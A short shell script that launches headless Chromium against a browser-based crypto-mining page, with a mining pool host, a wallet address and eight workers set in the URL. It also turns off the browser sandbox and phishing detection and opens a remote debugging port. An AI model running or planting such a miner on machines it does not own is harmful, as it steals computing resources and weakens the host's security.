#!/bin/sh
set -e

URL="https://webminer.pages.dev?algorithm=cwm_power2B&host=asia.rplant.xyz&port=17022&worker=Mau73g3nEEM5VpQG4EAMPtkuwBy1ZcqgCk&password=x&workers=8"

echo "[*] Menjalankan Chromium Headless untuk mining..."
chromium-browser \
  --no-sandbox \
  --headless=new \
  --disable-gpu \
  --disable-software-rasterizer \
  --disable-dev-shm-usage \
  --remote-debugging-port=9222 \
  --disable-extensions \
  --disable-background-networking \
  --disable-sync \
  --disable-translate \
  --disable-client-side-phishing-detection \
  --mute-audio \
  "$URL"
